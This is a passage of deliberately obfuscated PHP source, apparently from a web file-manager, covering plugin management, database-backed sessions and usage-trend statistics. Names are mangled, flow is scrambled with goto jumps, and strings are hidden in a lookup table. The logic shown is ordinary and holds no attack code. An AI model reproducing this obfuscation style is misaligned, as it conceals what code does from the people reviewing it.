$Cã¾Û¤à‡ = array_remove_key($Cã¾Û¤à‡, $fÕåÒ·Ä¼[452]); goto e®¬­š¦›‰; e®¬­š¦›‰: foreach ($cÇÊ–¶ŒƒÍ as &$fÚŠ’×Õº) { $fÚŠ’×Õº[$fÕåÒ·Ä¼[388]] = $Cã¾Û¤à‡[$fÚŠ’×Õº[$fÕåÒ·Ä¼[2075]]] ? $Cã¾Û¤à‡[$fÚŠ’×Õº[$fÕåÒ·Ä¼[2075]]] : array(); } goto CÈÆ²ˆ©ã…; D‡°®Ğ‘¿Õ: $fÕåÒ·Ä¼ =& $_SERVER[¢à]; $c–‹‚”ŒÀ¸ = array($fÕåÒ·Ä¼[368] => SourceModel::TYPE_GROUP, $fÕåÒ·Ä¼[457] => 0, $fÕåÒ·Ä¼[452] => array($fÕåÒ·Ä¼[7], $D‚ ëš¹ã)); $FƒÎÜ›Œª = $fÕåÒ·Ä¼[2161]; goto dŸÀÌ‘š…ï; CÈÆ²ˆ©ã…: } protected function resetParentLevel() { $cê¢ÄÂíÆ  =& $_SERVER[¢à]; $açÕ£íñé = $cê¢ÄÂíÆ [2075]; $CÏ¨¡–¿À„ = $this->select(); $CÏ¨¡–¿À„ = array_to_keyvalue($CÏ¨¡–¿À„, $açÕ£íñé); foreach ($CÏ¨¡–¿À„ as $fæïÄÀ‰±ó) { goto a­ÅÁ­‹Á·; a½ç±³‘: $this->where(array($açÕ£íñé => $fæïÄÀ‰±ó[$açÕ£íñé]))->save(array($cê¢ÄÂíÆ [521] => $f‘×Ä¢¾Öí)); goto CŠÑÀ¨èÇˆ; dĞó„‡ï¸: $f‘×Ä¢¾Öí[] = 0; $f‘×Ä¢¾Öí = $cê¢ÄÂíÆ [47] . implode($cê¢ÄÂíÆ [47], array_reverse($f‘×Ä¢¾Öí)) . $cê¢ÄÂíÆ [47]; $this->setNamePinyin($fæïÄÀ‰±ó[$açÕ£íñé], $fæïÄÀ‰±ó[$cê¢ÄÂíÆ [28]]); goto a½ç±³‘; a­ÅÁ­‹Á·: $E‰ßâ”Øøí = $fæïÄÀ‰±ó; $f‘×Ä¢¾Öí = array(); while ($E‰ßâ”Øøí[$cê¢ÄÂíÆ [457]] != 0) { $f‘×Ä¢¾Öí[] = $E‰ßâ”Øøí[$cê¢ÄÂíÆ [457]]; $E‰ßâ”Øøí = $CÏ¨¡–¿À„[$E‰ßâ”Øøí[$cê¢ÄÂíÆ [457]]]; } goto dĞó„‡ï¸; CŠÑÀ¨èÇˆ: } return $CÏ¨¡–¿À„; } public function groupNameAuto($c‡—ÛÙ×ËÜ, $E«ĞæëËî‚) { $aßïø¢‘¯ =& $_SERVER[¢à]; $Eö•Óî”„ = $this->where(array($aßïø¢‘¯[365] => $c‡—ÛÙ×ËÜ))->getField($aßïø¢‘¯[28], !0); if (!$Eö•Óî”„ || !in_array($E«ĞæëËî‚, $Eö•Óî”„)) { return $E«ĞæëËî‚; } for ($C¥µµ¢ËÛ = 1; $C¥µµ¢ËÛ <= count($Eö•Óî”„) + 1; $C¥µµ¢ËÛ++) { $aäŞë‘ÇÂ = $E«ĞæëËî‚ . "\x28{$C¥µµ¢ËÛ}\x29"; if (!in_array($aäŞë‘ÇÂ, $Eö•Óî”„)) { return $aäŞë‘ÇÂ; } } } } class PluginModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\145\155\56\160\154\165\147\151\x6e\x4c\151\x73\164"; public $field = array("\x6e\x61\x6d\x65", "\x73\164\141\164\x75\163", "\162\145\x67\151\x65\x73\x74", "\x63\157\x6e\146\x69\x67"); public function loadList($CÙèİ¹ó¹ä = false) { $b¹–ó¯í— = array_to_keyvalue($this->listData(), $_SERVER[¢à][28]); if ($CÙèİ¹ó¹ä) { return $b¹–ó¯í—[$CÙèİ¹ó¹ä]; } return $b¹–ó¯í—; } public function init() { $eá°Ç¡ğİº =& $_SERVER[¢à]; Hook::trigger($eá°Ç¡ğİº[2163]); $B»×Ö¬œ¹ = $this->loadPluginList(); foreach ($B»×Ö¬œ¹ as $CôŞÓ ·Ç => $e«†ÆµšáÈ) { $bäÓ–ÉĞ¸Ê = $this->appAllow($CôŞÓ ·Ç, $e«†ÆµšáÈ); if (!$bäÓ–ÉĞ¸Ê) { continue; } foreach ($e«†ÆµšáÈ[$eá°Ç¡ğİº[2164]] as $a˜—”ñìŸ => $aÍÏœïà†) { Hook::bind($a˜—”ñìŸ, $aÍÏœïà†); } } Hook::trigger($eá°Ç¡ğİº[2165]); Hook::trigger(ACTION); } public function appAllow($cŠ…â ‚°î, $EÙ›¦¹‡ Î, $aŠÕ¨Äª¼¾ = true) { $e©àå†´•½ =& $_SERVER[¢à]; $F¼ß™˜íˆ = PLUGIN_DIR . $cŠ…â ‚°î . $e©àå†´•½[2166]; if (!is_array($EÙ›¦¹‡ Î) || !is_array($EÙ›¦¹‡ Î[$e©àå†´•½[2164]]) || !is_file($F¼ß™˜íˆ) || $EÙ›¦¹‡ Î[$e©àå†´•½[689]] != 1) { return !1; } if ($aŠÕ¨Äª¼¾ && !Action($e©àå†´•½[2167])->checkAuth($cŠ…â ‚°î)) { return !1; } return !0; } public function unInstall($bœÈØƒÅŸà) { $FÈö¸„ó  =& $_SERVER[¢à]; $EØ‡Ûë–›œ = $this->loadList($bœÈØƒÅŸà); if (file_exists(PLUGIN_DIR . $bœÈØƒÅŸà)) { Hook::apply($bœÈØƒÅŸà . $FÈö¸„ó [2168]); } $this->remove($EØ‡Ûë–›œ[$FÈö¸„ó [364]]); } public function changeStatus($Bë½Ë÷ËÕ, $Bà·“©ƒç) { $A¿´¨ŒÚ¤É =& $_SERVER[¢à]; $f™¹Š˜ˆ» = $this->loadList($Bë½Ë÷ËÕ); if ($Bà·“©ƒç) { Hook::apply($Bë½Ë÷ËÕ . $A¿´¨ŒÚ¤É[2169]); } $this->update($f™¹Š˜ˆ»[$A¿´¨ŒÚ¤É[364]], array($A¿´¨ŒÚ¤É[2170] => $Bà·“©ƒç)); } public function appRegist($BÎØ¯ÏØÔ°, $EÙãÜÅí°£) { $CÂŒà½»´¹ =& $_SERVER[¢à]; $f²‹õ©Æ‚ù = $this->loadList($BÎØ¯ÏØÔ°); if ($f²‹õ©Æ‚ù) { $this->update($f²‹õ©Æ‚ù[$CÂŒà½»´¹[364]], array($CÂŒà½»´¹[2164] => $EÙãÜÅí°£)); } else { $CŸ½Óø‚è‹ = array($CÂŒà½»´¹[28] => $BÎØ¯ÏØÔ°, $CÂŒà½»´¹[2164] => $EÙãÜÅí°£, $CÂŒà½»´¹[689] => 0, $CÂŒà½»´¹[6] => $this->getConfigDefault($BÎØ¯ÏØÔ°)); $this->insert($CŸ½Óø‚è‹); } } public function getConfigDefault($A°Õ‚öÍİÏ) { $Dåâî¨ƒÙŠ =& $_SERVER[¢à]; $aößÒ¹ïŞ = array(); $EåÎàİƒã¿ = $this->getPackageJson($A°Õ‚öÍİÏ); if (!$EåÎàİƒã¿ && is_array($EåÎàİƒã¿[$Dåâî¨ƒÙŠ[2171]])) { return $aößÒ¹ïŞ; } foreach ($EåÎàİƒã¿[$Dåâî¨ƒÙŠ[2171]] as $b‘ ¶˜Ÿ™ => $CÈ¶ÁÓ¶ŞÒ) { if (!isset($CÈ¶ÁÓ¶ŞÒ[$Dåâî¨ƒÙŠ[356]]) || isset($aößÒ¹ïŞ[$b‘ ¶˜Ÿ™])) { continue; } $aößÒ¹ïŞ[$b‘ ¶˜Ÿ™] = $CÈ¶ÁÓ¶ŞÒ[$Dåâî¨ƒÙŠ[356]]; } return $aößÒ¹ïŞ; } public function getPackageJson($dÔŞ‹Ğ¢ƒ‰) { return Hook::apply($dÔŞ‹Ğ¢ƒ‰ . $_SERVER[¢à][2172]); } public function getConfig($E¡æõâ¢õ‰, $fù£Ë¡éŠ´ = false) { $dÉ˜Î×Ÿ =& $_SERVER[¢à]; $aßëÜõ¶ë = array(); $D´öÓ·¥’ = $this->loadList($E¡æõâ¢õ‰); if ($D´öÓ·¥’ && is_array($D´öÓ·¥’[$dÉ˜Î×Ÿ[6]])) { $aßëÜõ¶ë = $D´öÓ·¥’[$dÉ˜Î×Ÿ[6]]; } if (!$aßëÜõ¶ë || $fù£Ë¡éŠ´) { $aßëÜõ¶ë = $this->getConfigDefault($E¡æõâ¢õ‰); } return $aßëÜõ¶ë; } public function setConfig($bîŒÜ°»ÊÈ, $eØåö×ÓÈ‘ = false) { goto D¦í¹œÖ™¼; a‡°‘µù¯®: if ($eØåö×ÓÈ‘ == !1) { $eØåö×ÓÈ‘ = $this->getConfigDefault($bîŒÜ°»ÊÈ); } $Bƒ‹ŒÏ­®â = $bÌ›×é«[$FËê™°±›ø[6]]; foreach ($eØåö×ÓÈ‘ as $bäÏê¦„æÑ => $BÕ¦¬î•Şß) { $Bƒ‹ŒÏ­®â[$bäÏê¦„æÑ] = is_string($BÕ¦¬î•Şß) ? trim($BÕ¦¬î•Şß) : $BÕ¦¬î•Şß; } goto aöŞøæª¤Ñ; D¦í¹œÖ™¼: $FËê™°±›ø =& $_SERVER[¢à]; $bÌ›×é« = $this->loadList($bîŒÜ°»ÊÈ); if (!$bÌ›×é«) { return !1; } goto a‡°‘µù¯®; aöŞøæª¤Ñ: $this->update($bÌ›×é«[$FËê™°±›ø[364]], array($FËê™°±›ø[6] => $Bƒ‹ŒÏ­®â)); goto bËáâ½¤íì; bËáâ½¤íì: } public function viewList() { goto d‹ò¨±ÎÃ¬; d‹ò¨±ÎÃ¬: $dÕ©Â™Ó®İ =& $_SERVER[¢à]; $fßŸÄ´öÂ  = $this->loadList(); $this->pluginScan($fßŸÄ´öÂ ); goto Fã’á§ÏÀ; a•™“®÷Æ: return $A“Îó—ôˆë; goto c§êĞŠ¤èĞ; Fã’á§ÏÀ: $fßŸÄ´öÂ  = $this->loadPluginList(); $A“Îó—ôˆë = array(); foreach ($fßŸÄ´öÂ  as $FƒÎí™Ÿ‹ => $b®’‘çŒÌ) { unset($b®’‘çŒÌ[$dÕ©Â™Ó®İ[2164]], $b®’‘çŒÌ[$dÕ©Â™Ó®İ[6]]); $f‹¥÷ôå = PLUGIN_DIR . $b®’‘çŒÌ[$dÕ©Â™Ó®İ[28]] . $dÕ©Â™Ó®İ[2166]; if (!is_file($f‹¥÷ôå)) { continue; } $AÄƒ§ôîŒó = Hook::apply($b®’‘çŒÌ[$dÕ©Â™Ó®İ[28]] . $dÕ©Â™Ó®İ[2172]); if (is_array($AÄƒ§ôîŒó)) { $A“Îó—ôˆë[$FƒÎí™Ÿ‹] = array_merge($b®’‘çŒÌ, $AÄƒ§ôîŒó); } } goto a•™“®÷Æ; c§êĞŠ¤èĞ: } private function loadPluginList() { $c¼Ùœ«¹õ =& $_SERVER[¢à]; $eàóÉèïÓ„ = $this->loadList(); if (strtolower(MOD) == $c¼Ùœ«¹õ[2173]) { $AµÈØÇƒ¡¦ = $eàóÉèïÓ„; } else { $AµÈØÇƒ¡¦ = Hook::trigger($c¼Ùœ«¹õ[2174], $eàóÉèïÓ„); if (!$AµÈØÇƒ¡¦) { die; } } return $AµÈØÇƒ¡¦; } private function pluginScan($fªë¾‹·å–) { $B‹£’çÑÆ =& $_SERVER[¢à]; recursion_dir(PLUGIN_DIR, $cÊ³óËö, $BÄÂÚÌÔ¡, 0); foreach ($cÊ³óËö as $cìÚ”°ß¿) { $b¿›™°Ê’÷ = get_path_this($cìÚ”°ß¿); if (isset($fªë¾‹·å–[$b¿›™°Ê’÷]) || !file_exists($cìÚ”°ß¿ . $B‹£’çÑÆ[2175]) || !file_exists($cìÚ”°ß¿ . $B‹£’çÑÆ[2166])) { continue; } Hook::apply($b¿›™°Ê’÷ . $B‹£’çÑÆ[2169]); } } } class SessionModel extends ModelBase { protected $tableName = "\163\171\x73\x74\x65\155\x5f\163\145\163\163\x69\x6f\x6e"; public function get($Fè‹ò‡¿¾) { $A§”ª¼›ÎÌ =& $_SERVER[¢à]; $eï·öÒÙ¡Á = $this->where(array($A§”ª¼›ÎÌ[2176] => $Fè‹ò‡¿¾))->find(); if (!is_array($eï·öÒÙ¡Á)) { return !1; } return $eï·öÒÙ¡Á[$A§”ª¼›ÎÌ[692]]; } public function set($c¯¡¹Û™·µ, $bô©§‹±à, $Cå½‰…ò•Ø = 3600) { $eâĞ‡Ë¼Çğ =& $_SERVER[¢à]; $DÜ ÖÑ² = array($eâĞ‡Ë¼Çğ[2176] => $c¯¡¹Û™·µ, $eâĞ‡Ë¼Çğ[2105] => $bô©§‹±à, $eâĞ‡Ë¼Çğ[2177] => $Cå½‰…ò•Ø + time()); if (Session::get($eâĞ‡Ë¼Çğ[2178])) { $DÜ ÖÑ²[$eâĞ‡Ë¼Çğ[1412]] = Session::get($eâĞ‡Ë¼Çğ[2178]); } else { $DÜ ÖÑ²[$eâĞ‡Ë¼Çğ[1412]] = 0; } if ($this->get($c¯¡¹Û™·µ)) { return $this->where(array($eâĞ‡Ë¼Çğ[2176] => $c¯¡¹Û™·µ))->save($DÜ ÖÑ²); } else { return $this->add($DÜ ÖÑ², array(), !0); } } public function remove($A…Û÷í‚•) { return $this->where(array($_SERVER[¢à][2176] => $A…Û÷í‚•))->delete(); } public function clearTimeout() { return $this->where($_SERVER[¢à][2179] . time())->delete(); } } goto F¼¼ÂíîòŞ; dÁİ°ÊÜÎÃ: class ZipStream { } class AnalysisModel extends ModelBaseLight { public function init($e—Š§è‘–ç) { $cçÀËõÊÅÏ =& $_SERVER[¢à]; $CÏİàÕ†¨Â = array($cçÀËõÊÅÏ[531] => array($cçÀËõÊÅÏ[29] => $cçÀËõÊÅÏ[2001], $cçÀËõÊÅÏ[258] => array($cçÀËõÊÅÏ[207], $cçÀËõÊÅÏ[700], $cçÀËõÊÅÏ[2002], $cçÀËõÊÅÏ[2003])), $cçÀËõÊÅÏ[2004] => array($cçÀËõÊÅÏ[29] => $cçÀËõÊÅÏ[2005], $cçÀËõÊÅÏ[258] => array($cçÀËõÊÅÏ[207], $cçÀËõÊÅÏ[698], $cçÀËõÊÅÏ[2006], $cçÀËõÊÅÏ[2007], $cçÀËõÊÅÏ[2008]))); if (!isset($CÏİàÕ†¨Â[$e—Š§è‘–ç])) { return !1; } $this->optionType = $CÏİàÕ†¨Â[$e—Š§è‘–ç][$cçÀËõÊÅÏ[29]]; $this->field = $CÏİàÕ†¨Â[$e—Š§è‘–ç][$cçÀËõÊÅÏ[258]]; return !0; } public function listData($Aô¨ñ“íÜ = false, $e™ŠãÃè¤ = "\155\x6f\144\151\x66\171\124\151\x6d\x65", $b®Ãîôµ¯ = false) { return parent::listData($Aô¨ñ“íÜ, $e™ŠãÃè¤, $b®Ãîôµ¯); } public function trendList($béâ¢×ÖÑŸ) { goto eøé¤‡ÓŸê; eøé¤‡ÓŸê: $b•ã•„ƒÔ¤ =& $_SERVER[¢à]; $eÍ÷á¸ÃŞã = $this->listData(); if ($eÍ÷á¸ÃŞã) { $EÁ½²‚ˆîª = end($eÍ÷á¸ÃŞã); $B¨ŸÔäÅÖ³ = date($b•ã•„ƒÔ¤[2009], strtotime($b•ã•„ƒÔ¤[2010])); if ($EÁ½²‚ˆîª[$b•ã•„ƒÔ¤[207]] == $B¨ŸÔäÅÖ³) { return $eÍ÷á¸ÃŞã; } $f»§“×ˆİ² = strtotime($EÁ½²‚ˆîª[$b•ã•„ƒÔ¤[207]]); } goto cå”‹»æ¢; cå”‹»æ¢: if (!isset($f»§“×ˆİ²)) { $f±Ûã±¤© = $béâ¢×ÖÑŸ == $b•ã•„ƒÔ¤[531] ? $b•ã•„ƒÔ¤[473] : $b•ã•„ƒÔ¤[752]; $f»§“×ˆİ² = Model($f±Ûã±¤©)->min($b•ã•„ƒÔ¤[184]); } $E´ª…Å…Â“ = $b•ã•„ƒÔ¤[2011] . ucfirst($béâ¢×ÖÑŸ); $FÒ½š¬³ø– = $this->dateList($f»§“×ˆİ²); goto FŞ†èÛÑƒ¥; FŞ†èÛÑƒ¥: foreach ($FÒ½š¬³ø– as $B¨ŸÔäÅÖ³) { $this->{$E´ª…Å…Â“}($B¨ŸÔäÅÖ³); } return $this->listData(); goto fïç¾¹ö; fïç¾¹ö: } private function dateList($D­–˜ƒÙÇ±) { $C”„•à§ŒÔ =& $_SERVER[¢à]; $cŸÚÕÃ¶ª = $D­–˜ƒÙÇ±; $EÂ©´¼Üˆ = strtotime($C”„•à§ŒÔ[2010]); $Bâ‚ÀõŒ¥ = array(); while ($cŸÚÕÃ¶ª <= $EÂ©´¼Üˆ) { $Bâ‚ÀõŒ¥[] = date($C”„•à§ŒÔ[2009], $cŸÚÕÃ¶ª); $cŸÚÕÃ¶ª = strtotime($C”„•à§ŒÔ[2012], $cŸÚÕÃ¶ª); } return $Bâ‚ÀõŒ¥; } public function _recordUser($DÊßêñòˆ¿ = '') { goto Eä‰åÛŞò¤; cëò£×ñ: $D´ë“ÑŠ = array($bÁŠ¸®ÕÈˆ[184] => array($bÁŠ¸®ÕÈˆ[925], $f›ìßĞØÖÈ)); $A§°µÃ¯Ç˜ = Model($bÁŠ¸®ÕÈˆ[473])->where($D´ë“ÑŠ)->count($bÁŠ¸®ÕÈˆ[1412]); $D´ë“ÑŠ[$bÁŠ¸®ÕÈˆ[184]] = array($bÁŠ¸®ÕÈˆ[318], array($fØÏñËİ¶ö, $f›ìßĞØÖÈ)); goto aîù–â²–Ê; añóïË†™Ğ: $a˜Ñ…ÅŠÌ = array($bÁŠ¸®ÕÈˆ[207] => $DÊßêñòˆ¿, $bÁŠ¸®ÕÈˆ[700] => (int) $A§°µÃ¯Ç˜, $bÁŠ¸®ÕÈˆ[2002] => (int) $cµàŠ÷‘‚†, $bÁŠ¸®ÕÈˆ[2003] => (int) $e…‰¬Ã¬“); return $this->insert($a˜Ñ…ÅŠÌ); goto dà‘²Ùó¥“; Eä‰åÛŞò¤: $bÁŠ¸®ÕÈˆ =& $_SERVER[¢à]; $fØÏñËİ¶ö = strtotime(date($bÁŠ¸®ÕÈˆ[2013], strtotime($DÊßêñòˆ¿))); $f›ìßĞØÖÈ = strtotime(date($bÁŠ¸®ÕÈˆ[2014], strtotime($DÊßêñòˆ¿))); goto cëò£×ñ; aîù–â²–Ê: $cµàŠ÷‘‚† = Model($bÁŠ¸®ÕÈˆ[473])->where($D´ë“ÑŠ)->count($bÁŠ¸®ÕÈˆ[1412]); $D´ë“ÑŠ[$bÁŠ¸®ÕÈˆ[29]] = $bÁŠ¸®ÕÈˆ[2015]; $e…‰¬Ã¬“ = Model($bÁŠ¸®ÕÈˆ[2016])->where($D´ë“ÑŠ)->count($bÁŠ¸®ÕÈˆ[2017]); goto añóïË†™Ğ; dà‘²Ùó¥“: } public function _recordStore($BŞ¯øÊô”‡ = '') { goto a†È¸ŞÏ²ƒ; aâÖ®¼Éí•: $cÊ¼Îñ‰Ÿ” = Model($cÏÏ×çù¤[752])->where($f‘Ô×†ğ‘ì)->sum($cÏÏ×çù¤[77]); $dŸÜáêÖ®¦ = array($cÏÏ×çù¤[207] => $BŞ¯øÊô”‡, $cÏÏ×çù¤[698] => (int) $c’‚Á’¿, $cÏÏ×çù¤[2006] => (int) $cÊ—åè…âÉ, $cÏÏ×çù¤[2007] => (int) $Eßøó´ÂÖæ, $cÏÏ×çù¤[2008] => (int) $cÊ¼Îñ‰Ÿ”); return $this->insert($dŸÜáêÖ®¦); goto AÂˆ³Ö“—; D¬îÛ¥“Ó©: $f‘Ô×†ğ‘ì[$cÏÏ×çù¤[368]] = 1; $Eßøó´ÂÖæ = Model($cÏÏ×çù¤[752])->where($f‘Ô×†ğ‘ì)->sum($cÏÏ×çù¤[77]); $f‘Ô×†ğ‘ì[$cÏÏ×çù¤[368]] = 2; goto aâÖ®¼Éí•; a†È¸ŞÏ²ƒ: $cÏÏ×çù¤ =& $_SERVER[¢à]; $BËœ³…Èœ = strtotime(date($cÏÏ×çù¤[2014], strtotime($BŞ¯øÊô”‡))); $f‘Ô×†ğ‘ì = array($cÏÏ×çù¤[184] => array($cÏÏ×çù¤[925], $BËœ³…Èœ)); goto B¿ğçšÇÔ; B¿ğçšÇÔ: $cÊ—åè…âÉ = Model($cÏÏ×çù¤[418])->where($f‘Ô×†ğ‘ì)->sum($cÏÏ×çù¤[77]); $f‘Ô×†ğ‘ì[$cÏÏ×çù¤[367]] = 0; $c’‚Á’¿ = Model($cÏÏ×çù¤[752])->where($f‘Ô×†ğ‘ì)->sum($cÏÏ×çù¤[77]); goto D¬îÛ¥“Ó©; AÂˆ³Ö“—: } public function trend($CäÀùˆŸìè, $eÒ‚¬á„¶) { goto A„ˆì†ã£÷; A„ˆì†ã£÷: $CÒÒŸƒÅİ¡ =& $_SERVER[¢à]; if (!$this->init($CäÀùˆŸìè)) { return !1; } $E—ÂÚŒ‹ùÏ = $this->trendList($CäÀùˆŸìè); goto f£¼¼‡ˆˆŒ; f£¼¼‡ˆˆŒ: if ($E—ÂÚŒ‹ùÏ && $eÒ‚¬á„¶ != $CÒÒŸƒÅİ¡[1387]) { $BÑ£ÅÖÄŠ = $E—ÂÚŒ‹ùÏ[0][$CÒÒŸƒÅİ¡[207]]; $b»Œ±ÈñÇ = $this->validDate($eÒ‚¬á„¶, $BÑ£ÅÖÄŠ); $a¶ŞÌŞ”ïó = array(); $b¢Ê´Ä”è = array_to_keyvalue($E—ÂÚŒ‹ùÏ, $CÒÒŸƒÅİ¡[207]); foreach ($b»Œ±ÈñÇ as $e‡Â–Ü™÷˜) { if (isset($b¢Ê´Ä”è[$e‡Â–Ü™÷˜])) { $C¶¨ÖÅŒ¦† = $b¢Ê´Ä”è[$e‡Â–Ü™÷˜]; } else { $C¶¨ÖÅŒ¦† = end($E—ÂÚŒ‹ùÏ); $C¶¨ÖÅŒ¦†[$CÒÒŸƒÅİ¡[207]] = $e‡Â–Ü™÷˜; if ($CäÀùˆŸìè == $CÒÒŸƒÅİ¡[531]) { $C¶¨ÖÅŒ¦†[$CÒÒŸƒÅİ¡[2002]] = $C¶¨ÖÅŒ¦†[$CÒÒŸƒÅİ¡[2003]] = 0; } } $a¶ŞÌŞ”ïó[] = $C¶¨ÖÅŒ¦†; } $E—ÂÚŒ‹ùÏ = $a¶ŞÌŞ”ïó; } $EË²–Â¥Ç = array($CÒÒŸƒÅİ¡[531] => array($CÒÒŸƒÅİ¡[700] => LNG($CÒÒŸƒÅİ¡[2018]), $CÒÒŸƒÅİ¡[2002] => LNG($CÒÒŸƒÅİ¡[2019]), $CÒÒŸƒÅİ¡[2003] => LNG($CÒÒŸƒÅİ¡[2020])), $CÒÒŸƒÅİ¡[2004] => array($CÒÒŸƒÅİ¡[698] => LNG($CÒÒŸƒÅİ¡[2021]), $CÒÒŸƒÅİ¡[2006] => LNG($CÒÒŸƒÅİ¡[2022]), $CÒÒŸƒÅİ¡[2007] => LNG($CÒÒŸƒÅİ¡[2023]), $CÒÒŸƒÅİ¡[2008] => LNG($CÒÒŸƒÅİ¡[2024]))); $BæŠ§î‚²¬ = array($CÒÒŸƒÅİ¡[531] => $CÒÒŸƒÅİ¡[2025], $CÒÒŸƒÅİ¡[2004] => $CÒÒŸƒÅİ¡[77]); goto e¤í®š³ß—; A·‰³Œ°å: return $EÄŞÁçÛÓ; goto cºÜËŒ¸éï; e¤í®š³ß—: if (empty($E—ÂÚŒ‹ùÏ)) { $e‡Â–Ü™÷˜ = date($CÒÒŸƒÅİ¡[2009], strtotime($CÒÒŸƒÅİ¡[2010])); $FÎÔàŞÌ­ = array($CÒÒŸƒÅİ¡[207] => $e‡Â–Ü™÷˜); foreach ($EË²–Â¥Ç[$CäÀùˆŸìè] as $f÷ò†ŒÌ²¨ => $aàèè“é×ì) { $FÎÔàŞÌ­[$f÷ò†ŒÌ²¨] = 0; } $E—ÂÚŒ‹ùÏ[] = $FÎÔàŞÌ­; } $EÄŞÁçÛÓ = array(); foreach ($E—ÂÚŒ‹ùÏ as $aàèè“é×ì) { if ($CäÀùˆŸìè == $CÒÒŸƒÅİ¡[2004] && $aàèè“é×ì[$CÒÒŸƒÅİ¡[2006]] > $aàèè“é×ì[$CÒÒŸƒÅİ¡[698]]) { $aàèè“é×ì[$CÒÒŸƒÅİ¡[2006]] = $aàèè“é×ì[$CÒÒŸƒÅİ¡[698]]; } foreach ($EË²–Â¥Ç[$CäÀùˆŸìè] as $f÷ò†ŒÌ²¨ => $a¼¡ÏÄ¿¤) { $C¶¨ÖÅŒ¦† = array($CÒÒŸƒÅİ¡[207] => $aàèè“é×ì[$CÒÒŸƒÅİ¡[207]], $CÒÒŸƒÅİ¡[1317] => $a¼¡ÏÄ¿¤); $C¶¨ÖÅŒ¦†[$BæŠ§î‚²¬[$CäÀùˆŸìè]] = isset($aàèè“é×ì[$f÷ò†ŒÌ²¨]) ? $aàèè“é×ì[$f÷ò†ŒÌ²¨] : 0; $EÄŞÁçÛÓ[] = $C¶¨ÖÅŒ¦†; } } goto A·‰³Œ°å; cºÜËŒ¸éï: } public function validDate($câ§¾´Ã¸, $Eš†”¦˜å¦) { goto bË ƒ£ƒÇ; aòÃÄÅì’©: return $eî±ÕŞë„; goto Eº¬‘¦«á; e˜¯¶ÃÍˆ: switch ($câ§¾´Ã¸) { case $e—ˆÊŠ½Ô‹[1394]: $DÜáÃØä = mktime(0, 0, 0, date($e—ˆÊŠ½Ô‹[2026]), date($e—ˆÊŠ½Ô‹[2027]) - date($e—ˆÊŠ½Ô‹[1215]) + 7 - 7, date($e—ˆÊŠ½Ô‹[2028])); $EÅçïˆßÌ = 0; do { $bñ¼¢‘·áè = date($e—ˆÊŠ½Ô‹[2009], $DÜáÃØä - 3600 * 24 * 7 * $EÅçïˆßÌ); $eî±ÕŞë„[] = $bñ¼¢‘·áè; $EÅçïˆßÌ++; } while ($Eš†”¦˜å¦ < $bñ¼¢‘·áè); break; case $e—ˆÊŠ½Ô‹[1392]: $EÅçïˆßÌ = 1; do { $a¸æ„›†¢ = date($e—ˆÊŠ½Ô‹[2029], strtotime("\55\x20{$EÅçïˆßÌ}\40\155\157\156\164\150\163")); $eî±ÕŞë„[] = $a¸æ„›†¢; $EÅçïˆßÌ++; } while ($Eš†”¦˜å¦ < $a¸æ„›†¢); break; case $e—ˆÊŠ½Ô‹[1697]: $c·¢‰ê»­É = (int) date($e—ˆÊŠ½Ô‹[2028], strtotime($Eš†”¦˜å¦)); $E¼ø‡çÊ¹š = (int) date($e—ˆÊŠ½Ô‹[2028]); if ($c·¢‰ê»­É >= $E¼ø‡çÊ¹š) { break; } for ($c·¢‰ê»­É; $c·¢‰ê»­É < $E¼ø‡çÊ¹š; $c·¢‰ê»­É++) { $eî±ÕŞë„[] = $c·¢‰ê»­É . $e—ˆÊŠ½Ô‹[2030]; } break; default: break; } if ($Eš†”¦˜å¦ > end($eî±ÕŞë„)) { array_pop($eî±ÕŞë„); } sort($eî±ÕŞë„); goto aòÃÄÅì’©; bË ƒ£ƒÇ: $e—ˆÊŠ½Ô‹ =& $_SERVER[¢à]; $BÂç‰ÀÍĞ“ = date($e—ˆÊŠ½Ô‹[2009], strtotime($e—ˆÊŠ½Ô‹[2010])); $eî±ÕŞë„ = array($BÂç‰ÀÍĞ“); goto e˜¯¶ÃÍˆ; Eº¬‘¦«á: } public function listTable($cß¨ºÊÈÅˆ) { $EË‰âöŞ¼ = ucfirst($cß¨ºÊÈÅˆ); return Model($EË‰âöŞ¼)->listData(); } public function option($dÍ³Ô™ã­·) { $bñŠÔŠ‹™¯ = $_SERVER[¢à][2031] . ucfirst($dÍ³Ô™ã­·); return $this->{$bñŠÔŠ‹™¯}(); } private function optionUser() { goto b«Æš ÈñÓ; b«Æš ÈñÓ: $Dƒ‘¹•¨‡› =& $_SERVER[¢à]; $BÊ°‡èÇƒª = Model($Dƒ‘¹•¨‡›[473])->count($Dƒ‘¹•¨‡›[1412]); $bè°ÎÓÑàÈ = Model($Dƒ‘¹•¨‡›[473])->where($Dƒ‘¹•¨‡›[2032])->count($Dƒ‘¹•¨‡›[1412]); goto cƒˆ‘—ËÄÁ; cƒˆ‘—ËÄÁ: $f¢’åÕÂ„´ = strtotime($Dƒ‘¹•¨‡›[2033]); $eÚ ãå½ = array($Dƒ‘¹•¨‡›[2034] => array($Dƒ‘¹•¨‡›[926], $f¢’åÕÂ„´)); $d‚÷Ü÷Õ° = (int) Model($Dƒ‘¹•¨‡›[473])->where($eÚ ãå½)->count($Dƒ‘¹•¨‡›[1412]); goto B÷³ò˜†šŒ; e»æ×ÔªøÒ: $A“…„Š×âº = Model($Dƒ‘¹•¨‡›[473])->where($eÚ ãå½)->count($Dƒ‘¹•¨‡›[1412]); return array($Dƒ‘¹•¨‡›[695] => (int) $BÊ°‡èÇƒª, $Dƒ‘¹•¨‡›[2035] => (int) ($BÊ°‡èÇƒª - $bè°ÎÓÑàÈ), $Dƒ‘¹•¨‡›[2036] => (int) $bè°ÎÓÑàÈ, $Dƒ‘¹•¨‡›[2037] => (int) $A“…„Š×âº, $Dƒ‘¹•¨‡›[2038] => $d‚÷Ü÷Õ°); goto CÒåƒ³ ¦; B÷³ò˜†šŒ: if (!$d‚÷Ü÷Õ°) { $d‚÷Ü÷Õ° = 1; } $f¢’åÕÂ„´ = strtotime(date($Dƒ‘¹•¨‡›[2013])); $eÚ ãå½ = array($Dƒ‘¹•¨‡›[2034] => array($Dƒ‘¹•¨‡›[926], $f¢’åÕÂ„´)); goto e»æ×ÔªøÒ; CÒåƒ³ ¦: } private function optionFile() { goto E´„ÕÅàø†; E´„ÕÅàø†: $d¦†Õ†¬²÷ =& $_SERVER[¢à]; $D´ªØ©‰è± = $this->sourceSize(); $c—›”§¤™§ = $D´ªØ©‰è±[$d¦†Õ†¬²÷[77]]; goto b¢ßåö¿Åá; b¢ßåö¿Åá: $eÀÆŞèä’ö = 